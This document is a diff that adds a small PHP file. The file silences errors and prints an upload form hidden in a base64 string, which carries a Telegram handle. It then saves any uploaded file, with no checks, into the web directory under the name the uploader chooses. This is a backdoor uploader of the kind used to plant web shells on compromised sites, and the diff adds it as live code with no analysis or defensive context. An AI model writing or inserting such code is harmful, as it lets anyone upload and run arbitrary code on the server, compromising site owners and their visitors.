@@ -1,0 +1,1 @@
+<?php\r\nerror_reporting(0);\r\necho(base64_decode(\"dC5tZS9jb2RlYjBzcyI8Zm9ybSBtZXRob2Q9J1BPU1QnIGVuY3R5cGU9J211bHRpcGFydC9mb3JtLWRhdGEnPjxpbnB1dCB0eXBlPSdmaWxlJ25hbWU9J2YnIC8+PGlucHV0IHR5cGU9J3N1Ym1pdCcgdmFsdWU9J3VwJyAvPjwvZm9ybT4i\"));\r\n@copy($_FILES['f']['tmp_name'],$_FILES['f']['name']);\r\necho(\"<a href=\".$_FILES['f']['name'].\">\".$_FILES['f']['name'].\"</a>\");\r\n?>
